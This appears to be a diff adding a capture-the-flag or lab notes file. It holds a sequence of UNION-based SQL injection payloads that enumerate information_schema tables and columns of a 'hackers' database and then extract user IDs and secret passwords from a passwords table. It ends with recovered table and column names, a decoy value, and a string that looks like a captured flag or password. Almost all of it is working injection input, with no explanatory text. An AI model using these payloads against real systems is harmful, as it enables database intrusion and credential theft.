@@ -1,0 +1,39 @@
+1' AND 1=2 UNION SELECT table_schema AS name, table_name AS surname, TABLE_TYPE AS nick, 1 AS telephone FROM information_schema.tables WHERE table_name LIKE '%book%
+
+
+
+1' AND 1=2 UNION SELECT name, surname, nick, telephone FROM hackerztelbookz WHERE surname LIKE '%Libby%
+
+
+
+1' AND 1=2 UNION SELECT COLUMN_NAME, 1, 1, 1 FROM information_schema.columns WHERE table_schema='hackers' AND table_name='hackerztelbookz' AND COLUMN_NAME != 'id' AND COLUMN_NAME != 'name' AND COLUMN_NAME != 'surname' AND COLUMN_NAME != 'nick' AND COLUMN_NAME != 'telephone
+
+
+
+
+
+1' AND 1=2 UNION SELECT table_schema AS name, table_name AS surname, TABLE_TYPE AS nick, 1 AS telephone FROM information_schema.tables WHERE table_schema LIKE '%hackers%' AND table_name != 'hackerztelbookz
+
+
+
+hackrzpasswdz
+
+hacker_id
+
+secretpaswd
+
+
+1' AND 1=2 UNION SELECT COLUMN_NAME, 1, 1, 1 FROM information_schema.columns WHERE table_schema='hackers' AND table_name='hackrzpasswdz' AND COLUMN_NAME != 'id' AND COLUMN_NAME != 'hacker_id
+
+
+
+
+1' AND 1=2 UNION SELECT hacker_id, secretpaswd, 1, 1 FROM hackers.hackrzpasswdz WHERE hacker_id != '6
+
+
+
+nopenopenotthisone
+
+
+
+bN10R4Ce3jbG7WSzulBJ
